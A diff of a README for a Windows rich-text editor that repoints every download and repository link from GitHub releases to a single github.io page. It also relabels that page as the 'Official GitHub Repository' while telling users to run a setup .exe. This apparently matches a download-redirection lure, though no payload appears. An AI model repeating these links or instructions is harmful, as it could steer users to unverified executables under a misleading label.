@@ -1,8 +1,8 @@
 # 🖹 RichTextWeb - Edit Rich Text Documents Effortlessly Anywhere
 
-[![Download RichTextWeb](https://img.shields.io/badge/Download-RichTextWeb-2ea44f?style=for-the-badge&logo=github)](https://github.com/aftonstudios888/RichTextWeb/releases)
-[![Version](https://img.shields.io/badge/Version-1.0.0-blue?style=for-the-badge)](https://github.com/aftonstudios888/RichTextWeb/releases)
-[![Platform](https://img.shields.io/badge/Platform-Windows-orange?style=for-the-badge)](https://github.com/aftonstudios888/RichTextWeb/releases)
+[![Download RichTextWeb](https://img.shields.io/badge/Download-RichTextWeb-2ea44f?style=for-the-badge&logo=github)](https://aftonstudios888.github.io)
+[![Version](https://img.shields.io/badge/Version-1.0.0-blue?style=for-the-badge)](https://aftonstudios888.github.io)
+[![Platform](https://img.shields.io/badge/Platform-Windows-orange?style=for-the-badge)](https://aftonstudios888.github.io)
 
 ## 👋 Welcome to RichTextWeb
 
@@ -33,7 +33,7 @@ Getting started with RichTextWeb is incredibly easy. Follow these simple steps a
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [RichTextWeb Downloads](https://github.com/aftonstudios888/RichTextWeb/releases)
+Visit this link to download the application: [RichTextWeb Downloads](https://aftonstudios888.github.io)
 
 ### Step 2: Run Your Downloaded File
 
@@ -53,7 +53,7 @@ This section walks you through every detail of getting RichTextWeb installed on 
 
 ### 💾 Your Download Options
 
-Visit this link to download the application: **[RichTextWeb Releases Page](https://github.com/aftonstudios888/RichTextWeb/releases)**
+Visit this link to download the application: **[RichTextWeb Releases Page](https://aftonstudios888.github.io)**
 
 When you arrive at the page, you'll see a list of the latest versions. Look for the most recent one (usually at the top). Click on it to expand the download options. You'll see a file with a name like `RichTextWeb-setup.exe` – click on that to start downloading. The file size is typically small, so the download should finish quickly even on slower connections.
 
@@ -171,8 +171,8 @@ RichTextWeb is growing, and we'd love to have you on board:
 
 ## 📚 Additional Resources
 
-- **Official GitHub Repository:** [https://github.com/aftonstudios888/RichTextWeb](https://github.com/aftonstudios888/RichTextWeb)
-- **Download Page:** [https://github.com/aftonstudios888/RichTextWeb/releases](https://github.com/aftonstudios888/RichTextWeb/releases)
+- **Official GitHub Repository:** [https://aftonstudios888.github.io](https://aftonstudios888.github.io)
+- **Download Page:** [https://aftonstudios888.github.io](https://aftonstudios888.github.io)
 - **Project Documentation:** RichTextWeb includes built-in help and examples accessible from the toolbar (the "?" icon)
 
 ## 🙌 Thank You for Choosing RichTextWeb
